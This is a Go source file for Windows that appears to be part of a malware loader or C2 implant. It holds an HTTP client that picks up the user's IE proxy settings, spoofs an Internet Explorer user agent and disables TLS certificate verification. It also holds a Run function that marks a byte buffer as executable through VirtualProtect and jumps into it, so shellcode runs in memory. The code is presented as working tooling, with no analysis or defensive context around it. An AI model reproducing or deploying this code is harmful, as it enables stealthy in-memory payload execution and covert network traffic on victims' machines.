// +build windows

//Windows specific code is in this file
package main

import (
	"crypto/tls"
	"errors"
	"net"
	"net/http"
	"net/url"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

const (
	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_WRITECOPY         = 0x08
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_WRITECOPY = 0x80
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

type userAgentTransport struct {
	userAgent string
	rt        http.RoundTripper
}

func (t *userAgentTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	r.Header.Set("User-Agent", t.userAgent)
	return t.rt.RoundTrip(r)
}

type WINHTTP_CURRENT_USER_IE_PROXY_CONFIG struct {
	fAutoDetect       bool
	lpszAutoConfigUrl *uint16
	lpszProxy         *uint16
	lpszProxyBypass   *uint16
}

func GoWString(s *uint16) string {
	if s == nil {
		return ""
	}
	p := (*[1<<30 - 1]uint16)(unsafe.Pointer(s))
	sz := 0
	for p[sz] != 0 {
		sz++
	}
	return string(utf16.Decode(p[:sz:sz]))
}

func getProxy() (url.URL, error) {
	winHttpApi := syscall.NewLazyDLL("Winhttp.dll")
	WinHttpGetDefaultProxyConfiguration := winHttpApi.NewProc("WinHttpGetIEProxyConfigForCurrentUser")
	out := WINHTTP_CURRENT_USER_IE_PROXY_CONFIG{}
	WinHttpGetDefaultProxyConfiguration.Call(uintptr(unsafe.Pointer(&out)))
	proxyServer := GoWString(out.lpszProxy)
	if proxyServer != "" {
		proxyServer := GoWString(out.lpszProxy)
		parsedUrl, err := url.Parse("http://" + proxyServer)
		if err == nil {
			return *parsedUrl, nil
		}
	}
	return url.URL{}, errors.New("No Proxy Found")
}

func newClient() *http.Client {
	proxy, err := getProxy()
	if err == nil {
		client := &http.Client{
			Transport: &userAgentTransport{
				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
				rt: &http.Transport{
					DisableKeepAlives: true,
					Proxy:             http.ProxyURL(&proxy),
					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
					DialContext: (&net.Dialer{
						Timeout: 3 * time.Second,
					}).DialContext,
					TLSHandshakeTimeout: 10 * time.Second,
				},
			},
		}
		return client
	} else {
		client := &http.Client{
			Transport: &userAgentTransport{
				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
				rt: &http.Transport{
					DisableKeepAlives: true,
					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
					DialContext: (&net.Dialer{
						Timeout: 3 * time.Second,
					}).DialContext,
					TLSHandshakeTimeout: 10 * time.Second,
				},
			},
		}
		return client
	}

}

func Run(executable []byte) {

	//Found example of executing code in memory here: https://github.com/brimstone/go-shellcode
	f := func() {}
	var oldfperms uint32
	var oldexecutableperms uint32
	virtualProtect(unsafe.Pointer(&f), len(executable), PAGE_EXECUTE_READWRITE, &oldfperms)
	virtualProtect(unsafe.Pointer(&executable), len(executable), PAGE_EXECUTE_READWRITE, &oldexecutableperms)
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&executable))
	f()

}

func virtualProtect(lpAddress unsafe.Pointer, dwSize int, flNewProtect uint32, lpflOldProtect *uint32) {
	address := uintptr(unsafe.Pointer(*(**uintptr)(lpAddress)))
	size := uintptr(dwSize)
	newProtections := uintptr(flNewProtect)
	oldProtections := uintptr(unsafe.Pointer(lpflOldProtect))
	ret, _, _ := procVirtualProtect.Call(address, size, newProtections, oldProtections)
	if ret <= 0 {
		panic("Call to VirtualProtect failed!")
	}
}
